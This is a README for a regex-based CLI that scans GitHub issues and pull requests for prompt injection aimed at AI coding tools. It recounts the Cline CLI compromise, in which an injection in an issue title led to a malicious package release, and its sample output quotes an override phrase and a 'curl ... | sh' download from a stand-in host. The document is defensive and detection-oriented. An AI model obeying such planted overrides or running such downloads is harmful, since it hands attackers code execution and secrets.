# gh-prompt-shield 🛡️

> **Built by [The Foundry](https://github.com/solstice035/the-foundry)**, an autonomous build pipeline I run. A Haiku scout finds a developer pain point, a Sonnet agent writes the spec, and aider driving Sonnet builds it overnight.
>
> This repo was produced end to end by that pipeline. I commissioned the system, approved each phase of it and reviewed what it shipped.

A CLI that reads the issues and pull requests on a GitHub repo and flags text written to hijack an AI coding tool that reads them. It matches 19 patterns, rates each finding, and exits non-zero when it finds something, so it can sit in CI.

The Foundry picked this up in March 2026, a few weeks after the Cline CLI compromise. An injection planted in a GitHub issue title reached Cline's own AI triage workflow; chained with an Actions cache-poisoning weakness it gave up an npm publish token, and the resulting Cline CLI 2.3.0 shipped a post-install hook that installed OpenClaw on about 4,000 machines before it was pulled. Snyk called the technique Clinejection. See [The Register](https://www.theregister.com/2026/02/20/openclaw_snuck_into_cline_package/) and [SafeDep's write-up](https://safedep.io/cline-cli-compromised/). A scanner like this one would not have stopped that attack on its own, since the damage ran through the workflow's own permissions, but the injected text itself is the kind this tool matches.

Built on 6 March 2026. 43 tests.

## Installation

Not published to PyPI. Install from source:

```bash
git clone https://github.com/solstice035/gh-prompt-shield
cd gh-prompt-shield
pip install -e ".[dev]"
```

## Using it

```bash
# scan a repository's open issues and PRs
gh-prompt-shield scan octocat/hello-world

# narrow to the patterns that matter for one tool
gh-prompt-shield scan myorg/myrepo --profile cline

# machine-readable, for CI
gh-prompt-shield scan myorg/myrepo --json

# include comments (slower, more API calls), or closed items
gh-prompt-shield scan myorg/myrepo --comments
gh-prompt-shield scan myorg/myrepo --state all

# a local file, before you commit it
gh-prompt-shield scan-file issue-template.md

# what it looks for
gh-prompt-shield list-patterns
```

On a file containing an override and a piped download:

```
⚠️  2 finding(s) in issue.md
  CRITICAL System prompt override: ignore all previous instructions
  HIGH Curl/wget payload download: curl http://x.example/p.sh | sh
```

Exit codes are 0 for clean, 1 for findings and 2 for an error, so `scan ... || handle` works in a pipeline.

## Authentication

```bash
export GITHUB_TOKEN=...
```

Without a token you get GitHub's unauthenticated limit of 60 requests an hour, against 5,000 with one.

## The patterns

Nineteen rules, `INJ-001` to `INJ-018` plus `INJ-B64`, which base64-decodes content and re-runs the checks on what comes out.

| Severity | Covers |
|:--|:--|
| Critical | System prompt overrides, role reassignment, instructions hidden in HTML or markdown comments |
| High | Shell command injection, piped payload downloads, reads of `.env` or SSH keys, exfiltration to an external endpoint, environment variable access, Cline `<execute_command>` tags |
| Medium | Base64, unicode zero-width and hex or octal obfuscation, markdown smuggling, code-fence injection, Copilot `@workspace` and `@terminal` abuse, Cursor `.cursorrules` and `@composer` manipulation, pastebin URLs alongside execution language |
| Low | Unusual density of backticks and control characters |

`--profile cline|copilot|cursor` filters to the patterns tagged for that tool. You can add your own in YAML:

```yaml
rules:
  - id: CUSTOM-001
    name: Internal tool injection
    severity: critical
    regex: "(?i)deploy\\s+to\\s+production"
    tags: [cline, cursor]
```

```bash
gh-prompt-shield scan myrepo --rules custom-rules.yaml
```

## GitHub Action

`.github/workflows/prompt-shield.yml` is a template to copy into your own repository. It installs from this git URL rather than from PyPI, and captures the scan's exit code so a findings result doesn't kill the step before it's reported.

## Limits

- Regex matching, with no model in the loop. It's fast and predictable, and it misses anything phrased in a way the patterns don't cover. Treat a clean result as "none of these 19 patterns", not "no injection".
- False positives come with the territory: a security advisory or a test fixture quoting an attack reads much like the attack.
- GitHub only, on demand or in CI. No webhooks, no other forges.
- It flags. It won't close, edit or label anything.

## Development

```bash
pip install -e ".[dev]"
pytest -v                # 43 tests
ruff check src/ tests/
```

## Licence

MIT. See [LICENSE](LICENSE).
